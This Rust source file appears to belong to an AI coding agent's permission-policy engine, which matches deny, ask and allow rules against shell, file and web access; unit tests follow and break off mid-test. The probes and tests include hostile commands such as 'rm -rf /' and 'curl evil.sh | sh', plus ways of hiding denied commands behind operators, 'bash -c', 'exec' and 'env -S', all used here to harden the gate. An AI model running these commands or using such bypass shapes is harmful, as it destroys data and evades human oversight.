use crate::permission::bash_command_splitting::{
    MAX_INLINE_SHELL_DEPTH, all_commands_from_script, env_split_string_script,
    normalize_command_words,
};
use crate::permission::shell_access::combine_decisions;
use crate::permission::types::{
    AccessKind, Decision, PatternMode, PermissionConfig, PermissionRule, RuleAction, ToolFilter,
};
use xai_grok_tools::implementations::grok_build::web_fetch::domain::normalize_domain;

#[derive(Clone, Copy)]
enum MatchContext {
    /// `*` respects `/` as a segment boundary; `**` crosses it.
    Path,
    /// `*` matches any character including `/`.
    Freeform,
}

struct CompiledRule<'a> {
    rule: &'a PermissionRule,
    matcher: Option<&'a glob::Pattern>,
}

/// Permission policy with pre-compiled glob patterns.
pub struct CompiledPolicy {
    config: PermissionConfig,
    matchers: Vec<Option<glob::Pattern>>,
    /// True if any Read/Edit/Any deny/ask rule exists, so the shell file-access
    /// gate (`shell_access.rs`) should run. Read by `evaluate_shell_file_access`.
    pub(crate) has_file_restrictions: bool,
    /// True if any Bash/Any deny/ask rule exists, so the per-segment Bash command
    /// gate should run. Read by `evaluate_bash_command_policy`.
    has_bash_command_restrictions: bool,
}

impl CompiledPolicy {
    pub fn new(config: PermissionConfig) -> Self {
        let matchers = config
            .rules
            .iter()
            .map(|rule| {
                rule.pattern
                    .as_deref()
                    .filter(|p| *p != "*")
                    .and_then(|p| glob::Pattern::new(p).ok())
            })
            .collect();
        let has_file_restrictions = config.rules.iter().any(|rule| {
            matches!(rule.action, RuleAction::Deny | RuleAction::Ask)
                && matches!(
                    rule.tool,
                    ToolFilter::Read | ToolFilter::Edit | ToolFilter::Any
                )
        });
        let has_bash_command_restrictions = config.rules.iter().any(|rule| {
            matches!(rule.action, RuleAction::Deny | RuleAction::Ask)
                && matches!(rule.tool, ToolFilter::Bash | ToolFilter::Any)
        });
        Self {
            config,
            matchers,
            has_file_restrictions,
            has_bash_command_restrictions,
        }
    }

    /// Evaluate managed Bash/Any deny/ask command rules against every chained
    /// segment (wrappers like `timeout`/`env` peeled, `bash -c` scripts recursed
    /// into), not just the leading command. Escalation only: returns
    /// `Reject`/`Ask`, never `Allow`. A script that can't be decomposed fails
    /// closed to `Ask` rather than falling through.
    pub fn evaluate_bash_command_policy(&self, cmd: &str) -> Option<Decision> {
        if !self.has_bash_command_restrictions {
            return None;
        }
        self.evaluate_bash_command_segments(cmd, MAX_INLINE_SHELL_DEPTH)
    }

    fn evaluate_bash_command_segments(
        &self,
        cmd: &str,
        inline_depth_remaining: usize,
    ) -> Option<Decision> {
        let Some(segments) = all_commands_from_script(cmd) else {
            return Some(Decision::Ask);
        };
        let escalate = |segment: &str| match self.evaluate(&AccessKind::Bash(segment.to_owned())) {
            Some(Decision::Allow) | None => None,
            other => other,
        };
        let mut decision = None;
        for parsed in &segments {
            let raw_words = parsed.words();
            let norm = normalize_command_words(raw_words);
            decision = combine_decisions(decision, norm.exhausted.then_some(Decision::Ask));
            decision = combine_decisions(decision, norm.ambiguous.then_some(Decision::Ask));
            decision = combine_decisions(
                decision,
                norm.env_options_uncertain.then_some(Decision::Ask),
            );
            // WHY: every split-string shape keeps an Ask floor (Reject may still win).
            decision = combine_decisions(decision, norm.has_split_string.then_some(Decision::Ask));
            let inner_words = norm.words;
            let forms = std::iter::once(raw_words)
                .chain((inner_words.len() != raw_words.len()).then_some(inner_words));
            for words in forms {
                decision = combine_decisions(decision, escalate(&words.join(" ")));
            }
            let shell_words: Vec<ShellWord<'_>> = inner_words.iter().map(ShellWord::from).collect();
            match shell_dash_c_script(&shell_words) {
                InlineShellScript::Literal(index) if inline_depth_remaining > 0 => {
                    decision = combine_decisions(
                        decision,
                        self.evaluate_bash_command_segments(
                            inner_words[index].as_str(),
                            inline_depth_remaining - 1,
                        ),
                    );
                }
                InlineShellScript::Literal(_)
                | InlineShellScript::Untrusted
                | InlineShellScript::Unrecognized => {
                    decision = combine_decisions(decision, Some(Decision::Ask));
                }
                InlineShellScript::NotInline => {}
            }
            // High-confidence env -S: shared inline budget; Reject beats Ask floor.
            if let Some(script) = env_split_string_script(inner_words) {
                if inline_depth_remaining > 0 {
                    decision = combine_decisions(
                        decision,
                        self.evaluate_bash_command_segments(&script, inline_depth_remaining - 1),
                    );
                } else {
                    decision = combine_decisions(decision, Some(Decision::Ask));
                }
            }
        }
        decision
    }

    /// Evaluate using deny > ask > allow precedence (order-independent).
    pub fn evaluate(&self, access: &AccessKind) -> Option<Decision> {
        let mut matched_ask = false;
        let mut matched_allow = false;

        for (rule, matcher) in self.config.rules.iter().zip(&self.matchers) {
            if !tool_filter_matches(access, &rule.tool) {
                continue;
            }
            let cr = CompiledRule {
                rule,
                matcher: matcher.as_ref(),
            };
            if !pattern_matches(access, &cr) {
                continue;
            }
            match rule.action {
                RuleAction::Deny => {
                    let tool_label = match &rule.tool {
                        ToolFilter::Any => "any tool",
                        ToolFilter::Bash => "bash",
                        ToolFilter::Edit => "edit",
                        ToolFilter::Read => "read",
                        ToolFilter::Grep => "grep",
                        ToolFilter::Mcp => "mcp",
                        ToolFilter::WebFetch => "web_fetch",
                        ToolFilter::WebSearch => "web_search",
                    };
                    let reason = match &rule.pattern {
                        Some(pattern) => format!(
                            "Denied by permission policy: deny rule on {tool_label} matching \"{pattern}\""
                        ),
                        None => format!("Denied by permission policy: deny rule on {tool_label}"),
                    };
                    return Some(Decision::Reject(reason));
                }
                RuleAction::Ask => matched_ask = true,
                RuleAction::Allow => matched_allow = true,
            }
        }

        if matched_ask {
            return Some(Decision::Ask);
        }
        if matched_allow {
            return Some(Decision::Allow);
        }
        None
    }
}

impl From<PermissionConfig> for CompiledPolicy {
    fn from(config: PermissionConfig) -> Self {
        Self::new(config)
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum ShellWord<'a> {
    Literal(&'a str),
    Untrusted,
}

impl<'a> From<&'a String> for ShellWord<'a> {
    fn from(word: &'a String) -> Self {
        Self::Literal(word.as_str())
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum InlineShellScript {
    /// Not a supported-shell inline `-c` shape (and no unmodeled option ambiguity).
    NotInline,
    /// Trusted literal `-c` script at this word index.
    Literal(usize),
    /// Confirmed or potential `-c` shape whose script cannot be trusted for recursion
    /// (dynamic head/operand, missing script, ambiguous options after `-c`).
    Untrusted,
    /// Unmodeled/ambiguous options without evidence of `-c` string reinterpretation
    /// (e.g. `bash --version`). Security gates still Ask; auto-mode opaque-shell
    /// floor does not — only `Literal` / `Untrusted` re-interpret a command string.
    Unrecognized,
}

impl InlineShellScript {
    /// Auto-mode opaque-shell floor: true only for (potential) `-c` reinterpretation.
    pub(crate) fn is_potential_inline(self) -> bool {
        matches!(self, Self::Literal(_) | Self::Untrusted)
    }
}

/// Classify a supported shell's inline `-c` script without guessing option operands.
/// An untrusted program head that still matches a `-c` shape is `Untrusted` (Ask),
/// not a global Ask for every dynamic command. Unmodeled long options without `-c`
/// are `Unrecognized` (security Ask, not opaque-shell).
pub(crate) fn shell_dash_c_script(words: &[ShellWord<'_>]) -> InlineShellScript {
    let dynamic_head = match words.first() {
        Some(ShellWord::Literal(program)) => {
            let program = program.rsplit(['/', '\\']).next().unwrap_or(program);
            if !matches!(program, "bash" | "sh" | "dash" | "zsh" | "ksh") {
                return InlineShellScript::NotInline;
            }
            false
        }
        Some(ShellWord::Untrusted) => true,
        None => return InlineShellScript::NotInline,
    };

    let mut i = 1usize;
    let mut saw_c = false;
    let mut unrecognized = false;
    // After `-c`, fail closed as Untrusted; before `-c`, Unrecognized (security Ask
    // without claiming string reinterpretation for the opaque-shell floor).
    let ambiguous = |saw_c: bool| {
        if saw_c {
            InlineShellScript::Untrusted
        } else {
            InlineShellScript::Unrecognized
        }
    };
    let finish_literal = |index: usize| {
        if dynamic_head {
            InlineShellScript::Untrusted
        } else {
            InlineShellScript::Literal(index)
        }
    };
    while let Some(word) = words.get(i) {
        let ShellWord::Literal(word) = word else {
            return ambiguous(saw_c);
        };
        let word = *word;
        if word == "--" || word == "-" {
            if !saw_c {
                return if unrecognized {
                    InlineShellScript::Unrecognized
                } else {
                    InlineShellScript::NotInline
                };
            }
            return match words.get(i + 1) {
                Some(ShellWord::Literal(_)) => finish_literal(i + 1),
                Some(ShellWord::Untrusted) | None => InlineShellScript::Untrusted,
            };
        }
        if !word.starts_with('-') && !word.starts_with('+') {
            return if saw_c {
                finish_literal(i)
            } else if unrecognized {
                InlineShellScript::Unrecognized
            } else {
                InlineShellScript::NotInline
            };
        }
        if word == "--init-file" || word == "--rcfile" {
            match words.get(i + 1) {
                Some(ShellWord::Literal(_)) => i += 2,
                Some(ShellWord::Untrusted) | None => return ambiguous(saw_c),
            }
            continue;
        }
        if word.starts_with("--") {
            if matches!(word, "--noprofile" | "--norc" | "--posix") {
                i += 1;
                continue;
            }
            // Unmodeled long option: keep scanning for a later `-c` so
            // `bash --verbose -c '…'` stays potential-inline, while bare
            // `bash --version` / `bash --help` become Unrecognized (not opaque).
            if saw_c {
                return InlineShellScript::Untrusted;
            }
            unrecognized = true;
            i += 1;
            continue;
        }
        if matches!(word, "-o" | "+o" | "-O" | "+O") {
            match words.get(i + 1) {
                Some(ShellWord::Literal(value)) if !value.starts_with('-') => i += 2,
                Some(ShellWord::Literal(_)) => return ambiguous(saw_c),
                Some(ShellWord::Untrusted) | None => return ambiguous(saw_c),
            }
            continue;
        }
        if word.starts_with("-O") && word.len() > 2 {
            i += 1;
            continue;
        }
        if (word.starts_with("+O") || word.starts_with("+o")) && word.len() > 2 {
            i += 1;
            continue;
        }
        if word.starts_with("-o") && word.len() > 2 {
            return ambiguous(saw_c);
        }
        if word.starts_with('+') {
            i += 1;
            continue;
        }
        let flags = &word[1..];
        if flags.contains('o') || flags.contains('O') {
            return ambiguous(saw_c);
        }
        saw_c |= flags.contains('c');
        i += 1;
    }
    if saw_c {
        InlineShellScript::Untrusted
    } else if unrecognized {
        InlineShellScript::Unrecognized
    } else {
        InlineShellScript::NotInline
    }
}

fn tool_filter_matches(access: &AccessKind, filter: &ToolFilter) -> bool {
    match filter {
        ToolFilter::Any => true,
        ToolFilter::Bash => matches!(access, AccessKind::Bash(_)),
        ToolFilter::Edit => matches!(access, AccessKind::Edit(_)),
        // A Read rule also governs the Grep tool: grep reads file contents, so a
        // managed `Read` deny/ask on a path must block grepping that same path —
        // otherwise grep is a read-bypass. Grep-specific rules still use `Grep`.
        ToolFilter::Read => matches!(access, AccessKind::Read(_) | AccessKind::Grep { .. }),
        ToolFilter::Grep => matches!(access, AccessKind::Grep { .. }),
        ToolFilter::Mcp => matches!(access, AccessKind::MCPTool { .. }),
        ToolFilter::WebFetch => matches!(access, AccessKind::WebFetch(_)),
        ToolFilter::WebSearch => matches!(access, AccessKind::WebSearch(_)),
    }
}

fn pattern_matches(access: &AccessKind, cr: &CompiledRule<'_>) -> bool {
    let pattern = match cr.rule.pattern.as_deref() {
        Some(p) => p,
        None => return true,
    };
    if pattern == "*" {
        return true;
    }

    match access {
        // CWE-178: trim leading whitespace so deny rules cannot
        // be bypassed by prefixing commands with spaces.
        AccessKind::Bash(cmd) => {
            let cmd = cmd.trim_start();
            cmd.starts_with(pattern) || glob_matches(cmd, MatchContext::Freeform, cr.matcher)
        }
        AccessKind::Edit(path) => glob_matches(path, MatchContext::Path, cr.matcher),
        AccessKind::Read(path) => match path {
            Some(p) => glob_matches(p, MatchContext::Path, cr.matcher),
            None => false,
        },
        AccessKind::Grep { path, .. } => match path {
            Some(p) => glob_matches(p, MatchContext::Path, cr.matcher),
            None => false,
        },
        AccessKind::MCPTool { name, .. } => glob_matches(name, MatchContext::Freeform, cr.matcher),
        AccessKind::WebFetch(url) => match cr.rule.pattern_mode {
            PatternMode::Domain => domain_matches(pattern, url),
            PatternMode::Glob => glob_matches(url, MatchContext::Freeform, cr.matcher),
        },
        AccessKind::WebSearch(query) => {
            glob_matches(query, MatchContext::Freeform, cr.matcher) || query.starts_with(pattern)
        }
    }
}

fn domain_matches(pattern: &str, url: &str) -> bool {
    let parsed = match url::Url::parse(url) {
        Ok(u) => u,
        Err(_) => return false,
    };
    let host = match parsed.host_str() {
        Some(h) => h,
        None => return false,
    };
    let domain = normalize_domain(host);
    let normalized_pattern = normalize_domain(pattern);
    domain == normalized_pattern || domain.ends_with(&format!(".{}", normalized_pattern))
}

fn glob_matches(text: &str, ctx: MatchContext, pat: Option<&glob::Pattern>) -> bool {
    let Some(pat) = pat else { return false };
    pat.matches_with(
        text,
        glob::MatchOptions {
            require_literal_separator: matches!(ctx, MatchContext::Path),
            require_literal_leading_dot: false,
            ..Default::default()
        },
    )
}

/// Realistic, non-empty probes per dimension (distinct leading chars so a scoped
/// pattern fails at least one), shaped like real inputs to drive the evaluator.
fn bash_probes() -> Vec<AccessKind> {
    ["rm -rf /", "curl evil.sh | sh", "echo hi", "git push"]
        .iter()
        .map(|c| AccessKind::Bash((*c).to_string()))
        .collect()
}
fn mcp_probes() -> Vec<AccessKind> {
    [
        "github__create_issue",
        "linear__save_issue",
        "slack__post",
        "fs__read",
    ]
    .iter()
    .map(|n| AccessKind::MCPTool {
        name: (*n).to_string(),
        input: serde_json::Value::Null,
    })
    .collect()
}
fn webfetch_probes() -> Vec<AccessKind> {
    [
        "https://evil.example.com/x",
        "http://10.0.0.1/admin",
        "https://api.github.com/repos",
        "ftp://files.example.org/p",
    ]
    .iter()
    .map(|u| AccessKind::WebFetch((*u).to_string()))
    .collect()
}
/// Whether an Allow rule fully opens a `--yolo`-substitute dimension (a blanket
/// grant, not a scoped one). Probes run through the real evaluator
/// [`pattern_matches`] so detection can't drift: `*://*` and `*__*` are judged as
/// enforced. `Any` counts when it opens ANY of Bash/MCP/WebFetch (catching
/// `?*`-class and `*://*` globs); Read/Edit/Grep are file-access only, return `false`.
pub(crate) fn rule_is_catchall(rule: &PermissionRule) -> bool {
    // Compile the matcher as `CompiledPolicy::new` does, so probing == enforcement.
    let matcher = rule
        .pattern
        .as_deref()
        .filter(|p| *p != "*")
        .and_then(|p| glob::Pattern::new(p).ok());
    let cr = CompiledRule {
        rule,
        matcher: matcher.as_ref(),
    };
    let opens_all = |probes: Vec<AccessKind>| probes.iter().all(|a| pattern_matches(a, &cr));
    match rule.tool {
        ToolFilter::Bash => opens_all(bash_probes()),
        ToolFilter::Mcp => opens_all(mcp_probes()),
        ToolFilter::WebFetch => opens_all(webfetch_probes()),
        ToolFilter::Any => {
            opens_all(bash_probes()) || opens_all(mcp_probes()) || opens_all(webfetch_probes())
        }
        ToolFilter::Read | ToolFilter::Edit | ToolFilter::Grep | ToolFilter::WebSearch => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::permission::types::PermissionRule;

    // ── pattern_matches tests ─────────────────────────────────────────────

    fn rule_for(pattern: &str) -> PermissionRule {
        PermissionRule {
            action: RuleAction::Allow,
            tool: ToolFilter::Any,
            pattern: Some(pattern.to_string()),
            pattern_mode: PatternMode::Glob,
        }
    }

    fn domain_rule(pattern: &str) -> PermissionRule {
        PermissionRule {
            action: RuleAction::Allow,
            tool: ToolFilter::WebFetch,
            pattern: Some(pattern.to_string()),
            pattern_mode: PatternMode::Domain,
        }
    }

    fn matches(access: &AccessKind, rule: &PermissionRule) -> bool {
        let policy = CompiledPolicy::new(PermissionConfig::new(vec![rule.clone()]));
        let cr = CompiledRule {
            rule: &policy.config.rules[0],
            matcher: policy.matchers[0].as_ref(),
        };
        pattern_matches(access, &cr)
    }

    #[test]
    fn test_bash_pattern_matching() {
        let access = AccessKind::Bash("npm install".to_string());
        assert!(matches(&access, &rule_for("npm*")));
        assert!(matches(&access, &rule_for("npm install")));
        assert!(!matches(&access, &rule_for("cargo*")));
    }

    #[test]
    fn rule_is_catchall_shares_the_evaluator() {
        let rule = |tool: ToolFilter, pattern: Option<&str>, mode: PatternMode| PermissionRule {
            action: RuleAction::Allow,
            tool,
            pattern: pattern.map(str::to_string),
            pattern_mode: mode,
        };
        let glob = |tool: ToolFilter, p: Option<&str>| rule(tool, p, PatternMode::Glob);

        // Bare / universal / prefix-regime globs are catch-alls in every
        // substitute dimension, including `Any` (commands, MCP names, URLs, paths).
        for tool in [
            ToolFilter::Bash,
            ToolFilter::Mcp,
            ToolFilter::WebFetch,
            ToolFilter::Any,
        ] {
            assert!(rule_is_catchall(&glob(tool.clone(), None)), "{tool:?} bare");
            assert!(
                rule_is_catchall(&glob(tool.clone(), Some("*"))),
                "{tool:?} *"
            );
            assert!(
                rule_is_catchall(&glob(tool.clone(), Some("**"))),
                "{tool:?} **"
            );
            // `?*` matches every non-empty input — the prefix-regime gap the old
            // empty-string probe missed, now closed for `Any` too.
            assert!(
                rule_is_catchall(&glob(tool.clone(), Some("?*"))),
                "{tool:?} ?*"
            );
        }
        // `Any(**/*)` is also universal (preserves the old Any-detector case).
        assert!(rule_is_catchall(&glob(ToolFilter::Any, Some("**/*"))));

        // Shape-specific catch-alls a bash-shaped probe missed, judged via the
        // real matcher.
        assert!(rule_is_catchall(&glob(ToolFilter::WebFetch, Some("*://*"))));
        assert!(rule_is_catchall(&glob(ToolFilter::Mcp, Some("*__*"))));
        // `Any` also counts when it fully opens a single dimension (all web).
        assert!(rule_is_catchall(&glob(ToolFilter::Any, Some("*://*"))));

        // Scoped grants survive in every dimension; for `Any`, a pattern scoped
        // to one regime fails the others' probes.
        assert!(!rule_is_catchall(&glob(ToolFilter::Bash, Some("git *"))));
        assert!(!rule_is_catchall(&glob(ToolFilter::Bash, Some("npm*"))));
        assert!(!rule_is_catchall(&glob(ToolFilter::Mcp, Some("github__*"))));
        assert!(!rule_is_catchall(&glob(
            ToolFilter::WebFetch,
            Some("https://api.example.com/*")
        )));
        assert!(!rule_is_catchall(&glob(ToolFilter::Any, Some("src/**"))));
        assert!(!rule_is_catchall(&glob(ToolFilter::Any, Some("git *"))));
        // Domain mode is judged by the real domain matcher: one domain is scoped.
        assert!(!rule_is_catchall(&rule(
            ToolFilter::WebFetch,
            Some("evil.example.com"),
            PatternMode::Domain
        )));
        // Read/Edit/Grep are file-access only: never a `--yolo`-substitute catch-all.
        assert!(!rule_is_catchall(&glob(ToolFilter::Read, Some("**"))));
        assert!(!rule_is_catchall(&glob(ToolFilter::Edit, Some("*"))));
    }

    #[test]
    fn test_edit_path_mode() {
        // * doesn't cross / in path mode; ** does
        let access = AccessKind::Edit("/path/to/file.rs".to_string());
        assert!(!matches(&access, &rule_for("/path*")));
        assert!(matches(&access, &rule_for("/path/**")));
        assert!(matches(&access, &rule_for("/path/**/file.rs")));
        assert!(matches(&access, &rule_for("**/*.rs")));
    }

    #[test]
    fn test_web_fetch_domain_matching() {
        let access = AccessKind::WebFetch("https://api.example.com/v1/data".to_string());
        assert!(matches(&access, &domain_rule("example.com")));
        assert!(matches(&access, &domain_rule("api.example.com")));
        assert!(!matches(&access, &domain_rule("other.com")));
        // www. normalization
        let www = AccessKind::WebFetch("https://www.example.com/page".to_string());
        assert!(matches(&www, &domain_rule("example.com")));
    }

    #[test]
    fn test_none_and_wildcard_patterns() {
        // None pattern = match all (used by bare tool rules like "Bash" with no specifier)
        let none_rule = PermissionRule {
            action: RuleAction::Allow,
            tool: ToolFilter::Any,
            pattern: None,
            pattern_mode: PatternMode::Glob,
        };
        assert!(matches(&AccessKind::Bash("anything".into()), &none_rule));
        assert!(matches(&AccessKind::Read(None), &none_rule));

        // Read(None) should not match a specific pattern
        assert!(!matches(&AccessKind::Read(None), &rule_for("src/*")));
    }

    // ── tool_filter_matches tests ──────────────────────────────────────────

    #[test]
    fn test_tool_filter_any() {
        assert!(tool_filter_matches(
            &AccessKind::Bash("x".into()),
            &ToolFilter::Any
        ));
        assert!(tool_filter_matches(
            &AccessKind::Edit("x".into()),
            &ToolFilter::Any
        ));
        assert!(tool_filter_matches(
            &AccessKind::Read(None),
            &ToolFilter::Any
        ));
    }

    #[test]
    fn test_tool_filter_bash() {
        assert!(tool_filter_matches(
            &AccessKind::Bash("x".into()),
            &ToolFilter::Bash
        ));
        assert!(!tool_filter_matches(
            &AccessKind::Edit("x".into()),
            &ToolFilter::Bash
        ));
    }

    #[test]
    fn test_tool_filter_edit() {
        assert!(tool_filter_matches(
            &AccessKind::Edit("x".into()),
            &ToolFilter::Edit
        ));
        assert!(!tool_filter_matches(
            &AccessKind::Bash("x".into()),
            &ToolFilter::Edit
        ));
    }

    #[test]
    fn test_tool_filter_read() {
        assert!(tool_filter_matches(
            &AccessKind::Read(None),
            &ToolFilter::Read
        ));
        assert!(!tool_filter_matches(
            &AccessKind::Bash("x".into()),
            &ToolFilter::Read
        ));
    }

    #[test]
    fn test_tool_filter_mcp() {
        assert!(tool_filter_matches(
            &AccessKind::MCPTool {
                name: "fs".into(),
                input: serde_json::Value::Null,
            },
            &ToolFilter::Mcp
        ));
        assert!(!tool_filter_matches(
            &AccessKind::Read(None),
            &ToolFilter::Mcp
        ));
    }

    #[test]
    fn test_tool_filter_web_fetch() {
        assert!(tool_filter_matches(
            &AccessKind::WebFetch("https://example.com".into()),
            &ToolFilter::WebFetch
        ));
        assert!(!tool_filter_matches(
            &AccessKind::Bash("x".into()),
            &ToolFilter::WebFetch
        ));
    }

    // ── evaluate tests ─────────────────────────────────────────────────────

    fn evaluate_policy(access: &AccessKind, config: &PermissionConfig) -> Option<Decision> {
        CompiledPolicy::new(config.clone()).evaluate(access)
    }

    fn bash_rule(action: RuleAction, pattern: &str) -> PermissionRule {
        PermissionRule {
            action,
            tool: ToolFilter::Bash,
            pattern: Some(pattern.to_string()),
            pattern_mode: PatternMode::Glob,
        }
    }

    #[test]
    fn test_evaluate_policy_deny_beats_allow() {
        let policy = PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "*"),
            bash_rule(RuleAction::Deny, "rm*"),
        ]);
        let result = evaluate_policy(&AccessKind::Bash("rm -rf /".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
        let result = evaluate_policy(&AccessKind::Bash("ls".into()), &policy);
        assert!(matches!(result, Some(Decision::Allow)));
    }

    #[test]
    fn test_evaluate_policy_ask_forces_prompt() {
        let policy = PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "*"),
            bash_rule(RuleAction::Ask, "git push*"),
        ]);
        let result = evaluate_policy(&AccessKind::Bash("git push origin main".into()), &policy);
        assert!(matches!(result, Some(Decision::Ask)));
        let result = evaluate_policy(&AccessKind::Bash("ls".into()), &policy);
        assert!(matches!(result, Some(Decision::Allow)));
    }

    #[test]
    fn test_evaluate_policy_deny_beats_ask() {
        let policy = PermissionConfig::new(vec![
            bash_rule(RuleAction::Ask, "rm*"),
            bash_rule(RuleAction::Deny, "rm -rf*"),
        ]);
        let result = evaluate_policy(&AccessKind::Bash("rm -rf /".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
    }

    #[test]
    fn claude_bash_colon_wildcard_deny_rejects_by_prefix() {
        use crate::permission::rules::parse_permission_rule;
        // A `Bash(cmd:*)` deny must reject by command prefix, not sit as a dead `cmd:*` glob.
        let rule = parse_permission_rule("Bash(sed:*)", RuleAction::Deny).unwrap();
        let policy = PermissionConfig::new(vec![rule]);
        let result = evaluate_policy(&AccessKind::Bash("sed -n '1,5p' file.txt".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
        // Deliberate superset of upstream word-boundary `:*`: raw prefix also denies `sed-evil`.
        assert!(matches!(
            evaluate_policy(&AccessKind::Bash("sed-evil".into()), &policy),
            Some(Decision::Reject(_))
        ));
        assert!(evaluate_policy(&AccessKind::Bash("ls".into()), &policy).is_none());
    }

    // ── CompiledPolicy reuse tests ────────────────────────────────────────

    #[test]
    fn test_compiled_policy_reuse_across_evaluations() {
        let compiled = CompiledPolicy::new(PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "npm*"),
            bash_rule(RuleAction::Deny, "rm*"),
            bash_rule(RuleAction::Ask, "git push*"),
        ]));

        assert!(matches!(
            compiled.evaluate(&AccessKind::Bash("npm test".into())),
            Some(Decision::Allow)
        ));
        assert!(matches!(
            compiled.evaluate(&AccessKind::Bash("rm -rf /".into())),
            Some(Decision::Reject(_))
        ));
        assert!(matches!(
            compiled.evaluate(&AccessKind::Bash("git push origin".into())),
            Some(Decision::Ask)
        ));
        assert!(
            compiled
                .evaluate(&AccessKind::Bash("cargo build".into()))
                .is_none()
        );
    }

    // ── whitespace prefix bypass regression tests ─────────────────

    #[test]
    fn test_bash_deny_not_bypassed_by_whitespace_prefix() {
        let policy = PermissionConfig::new(vec![bash_rule(RuleAction::Deny, "rm*")]);
        let result = evaluate_policy(&AccessKind::Bash("  rm -rf /".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
        let result = evaluate_policy(&AccessKind::Bash("\trm -rf /".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
    }

    #[test]
    fn test_bash_deny_not_bypassed_by_whitespace_with_glob() {
        let policy = PermissionConfig::new(vec![
            bash_rule(RuleAction::Deny, "rm*"),
            bash_rule(RuleAction::Allow, "*"),
        ]);
        let result = evaluate_policy(&AccessKind::Bash("   rm -rf /".into()), &policy);
        assert!(matches!(result, Some(Decision::Reject(_))));
        let result = evaluate_policy(&AccessKind::Bash("ls -la".into()), &policy);
        assert!(matches!(result, Some(Decision::Allow)));
    }

    #[test]
    fn test_bash_pattern_trims_whitespace() {
        let access = AccessKind::Bash("  npm install".to_string());
        assert!(matches(&access, &rule_for("npm*")));
        assert!(matches(&access, &rule_for("npm install")));

        let access = AccessKind::Bash("\t\t rm -rf".to_string());
        assert!(matches(&access, &rule_for("rm*")));
    }

    // ── Deny bypass via shell operators ──────────────────────────────────

    #[test]
    fn bash_deny_enforced_in_non_leading_command_position() {
        let policy = CompiledPolicy::new(PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "*"),
            bash_rule(RuleAction::Deny, "id *"),
            bash_rule(RuleAction::Deny, "id"),
        ]));
        // A denied command after an operator / wrapper / `bash -c` must be rejected.
        for cmd in [
            "echo SAFE && id > M.txt",
            "echo SAFE; id > M.txt",
            "echo SAFE | cat; id > M.txt",
            "timeout 5 id",
            "bash -c \"id > M.txt\"",
            "bash -c -x \"id > M.txt\"",
            "bash -c -- \"id > M.txt\"",
            "bash -c -o pipefail \"id > M.txt\"",
            "bash -c -O extglob \"id > M.txt\"",
            "bash -c -Oextglob \"id > M.txt\"",
            "exec id",
            "command id",
            "exec bash -c \"id > M.txt\"",
        ] {
            assert!(
                matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Reject(_))
                ),
                "denied command in a non-leading position must be rejected: {cmd}"
            );
        }
        // High-confidence env -S packed denials hard-Reject; uncertain shapes Ask.
        for cmd in ["env -S 'id'", "env -S 'bash -c id'"] {
            assert!(
                matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Reject(_))
                ),
                "high-confidence env -S must reject denied payload: {cmd}"
            );
        }
        // Transparent-prefix depth: eight peels reach the command; a ninth Asks.
        use crate::permission::bash_command_splitting::MAX_TRANSPARENT_PREFIX_DEPTH;
        let nested_exec = |depth: usize| format!("{}id", "exec ".repeat(depth));
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&nested_exec(MAX_TRANSPARENT_PREFIX_DEPTH)),
                Some(Decision::Reject(_))
            ),
            "maximum transparent prefix depth must still reach the denied command"
        );
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&nested_exec(MAX_TRANSPARENT_PREFIX_DEPTH + 1)),
                Some(Decision::Ask)
            ),
            "one extra transparent prefix must fail closed under bash command policy"
        );
        let exhausted_then_deny = format!(
            "{}; id",
            nested_exec(MAX_TRANSPARENT_PREFIX_DEPTH + 1).replace("id", "echo hi")
        );
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&exhausted_then_deny),
                Some(Decision::Reject(_))
            ),
            "a later denied command must beat transparent exhaustion Ask"
        );
        for cmd in [
            "bash -c +O extglob id",
            "bash -c +Oextglob id",
            "bash -c +o pipefail id",
        ] {
            assert!(matches!(
                policy.evaluate_bash_command_policy(cmd),
                Some(Decision::Reject(_))
            ));
        }
        for cmd in ["bash -- -c id", "bash script.sh -c id"] {
            assert!(
                !matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Reject(_))
                ),
                "non-inline shell form must not recurse into `id`: {cmd}"
            );
        }
        // Scripts that cannot be decomposed must fail closed (prompt), not allow.
        for cmd in ["OUT=$(id); echo \"$OUT\" > M.txt", "echo \"`id`\" > M.txt"] {
            assert!(
                matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Ask)
                ),
                "an undecomposable script must escalate, not fall through to allow: {cmd}"
            );
        }
        // Alternating normalization still reaches the denied command through pure `env` wrappers.
        let wrapped = format!("{}bash -c 'id'", "env ".repeat(9));
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&wrapped),
                Some(Decision::Reject(_))
            ),
            "bounded alternating normalize must still reach denied `id` under env wrappers"
        );
        // A clean compound with no denied segment is not escalated.
        assert!(
            policy
                .evaluate_bash_command_policy("echo hi && ls")
                .is_none()
        );
        // With no Bash deny/ask rules the gate is inert.
        let no_restrictions = CompiledPolicy::new(PermissionConfig::new(vec![bash_rule(
            RuleAction::Allow,
            "*",
        )]));
        assert!(
            no_restrictions
                .evaluate_bash_command_policy("echo SAFE && id")
                .is_none()
        );
    }

    /// Managed Bash deny fidelity for `env -S`/`--split-string`: high-confidence
    /// packed payloads hard-Reject; every split-string shape keeps an Ask floor.
    #[test]
    fn env_split_string_bash_deny_fidelity() {
        use crate::permission::bash_command_splitting::{MAX_NORMALIZE_ROUNDS, MAX_WRAPPER_DEPTH};

        let policy = CompiledPolicy::new(PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "*"),
